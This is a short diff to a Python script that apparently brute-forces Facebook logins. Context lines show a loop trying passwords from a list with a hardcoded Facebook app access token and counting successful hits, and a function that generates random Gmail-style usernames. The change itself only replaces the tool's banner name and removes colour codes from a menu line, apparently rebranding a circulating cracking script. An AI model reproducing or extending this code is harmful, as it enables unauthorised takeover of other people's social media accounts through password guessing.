@@ -433,7 +433,7 @@ def m1(ids,passlist):
 def m2(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [AKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [MR-ZEE] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -667,7 +667,7 @@ def gmail():
                                 mail = ''.join(random.choice(string.digits) for _ in range(4))
                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                         fo = open('.re.txt', 'r').read().splitlines()
-                print(' [1] File Method\x1b[1;92m [1] \n\x1b[1;97m[2] File Method \x1b[1;92m[2]')
+                print(' [1] File Method [1] [2] File Method [2]')
                 linex()
                 mthd=input(' Choose: ')
                 linex()
